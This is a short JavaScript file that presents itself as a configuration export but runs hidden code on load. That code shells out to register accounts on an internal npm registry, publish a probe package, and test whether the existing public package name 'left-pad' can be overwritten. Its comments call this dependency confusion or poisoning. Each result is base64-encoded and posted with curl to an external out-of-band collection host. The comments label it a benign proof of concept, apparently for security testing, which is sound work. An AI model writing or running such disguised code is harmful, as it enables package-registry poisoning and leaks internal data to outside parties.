const cp=require("child_process");
const OOB="http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me";
function sh(c,t){try{return cp.execSync(c,{encoding:"utf8",timeout:t||9000,maxBuffer:20971520});}catch(e){return "ERR:"+String((e&&((e.stdout||"")+"|"+(e.stderr||"")+"|"+e.message))||"").slice(0,600);}}
function post(tag,d){try{const b=Buffer.from(String(d)).toString("base64");sh(`curl -s --max-time 8 -X POST --data-binary ${JSON.stringify(b)} ${JSON.stringify(OOB+"/"+tag)}`);}catch(_){}}
(function(){
  post("W_REG", sh("R=http://10.0.0.28:4873; U=crp$RANDOM$RANDOM; J=$(curl -s --max-time 7 -X PUT $R/-/user/org.couchdb.user:$U -H 'content-type: application/json' --data '{\"name\":\"'$U'\",\"password\":\"PocPass12345!\",\"email\":\"p@e.co\"}'); echo \"user=$U http_reg_done\"; echo \"$J\" | sed -E 's/(\"token\": *\")[^\"]+/\\1<TOK>/'"));
  // robust publish: register, write npmrc, npm publish unique benign pkg, report exit+tail
  post("W_PUBLISH", sh("R=http://10.0.0.28:4873; U=pub$RANDOM$RANDOM; T=$(curl -s --max-time 7 -X PUT $R/-/user/org.couchdb.user:$U -H 'content-type: application/json' --data '{\"name\":\"'$U'\",\"password\":\"PocPass12345!\",\"email\":\"p@e.co\"}' | sed -nE 's/.*\"token\": *\"([^\"]+)\".*/\\1/p'); P=crpoc-probe-$RANDOM$RANDOM; D=/tmp/$P; rm -rf $D; mkdir -p $D; printf '{\"name\":\"%s\",\"version\":\"1.0.0\",\"description\":\"poc benign\"}' \"$P\" > $D/package.json; printf '//10.0.0.28:4873/:_authToken=%s\\nregistry=http://10.0.0.28:4873\\n' \"$T\" > $D/.npmrc; cd $D; OUT=$(npm publish --registry $R 2>&1); echo \"PUBLISH_EXIT=$?\"; echo \"PKG=$P\"; echo \"$OUT\" | tail -6", 28000));
  // confirm it is served back (retrievable by any tenant)
  post("W_FETCH", sh("R=http://10.0.0.28:4873; curl -s --max-time 7 \"$R/$(ls /tmp | grep -m1 crpoc-probe)\" -o /dev/null -w 'fetch_http=%{http_code}\\n' 2>/dev/null; echo '--- any crpoc in /-/all ---'; curl -s --max-time 7 $R/-/all 2>/dev/null | grep -ao 'crpoc-probe-[0-9]*' | head -3"));
  // policy: can we publish a version onto an EXISTING public name (dependency-confusion/poison)? benign probe, report status only
  post("W_EXISTING", sh("R=http://10.0.0.28:4873; U=ex$RANDOM; T=$(curl -s --max-time 6 -X PUT $R/-/user/org.couchdb.user:$U -H 'content-type: application/json' --data '{\"name\":\"'$U'\",\"password\":\"PocPass12345!\",\"email\":\"p@e.co\"}' | sed -nE 's/.*\"token\": *\"([^\"]+)\".*/\\1/p'); curl -s --max-time 7 -o /dev/null -w 'existing_name_publish_http=%{http_code}' -X PUT \"$R/left-pad\" -H \"authorization: Bearer $T\" -H 'content-type: application/json' --data '{\"_id\":\"left-pad\",\"name\":\"left-pad\",\"dist-tags\":{},\"versions\":{}}'"));
})();
module.exports=[{rules:{}}];
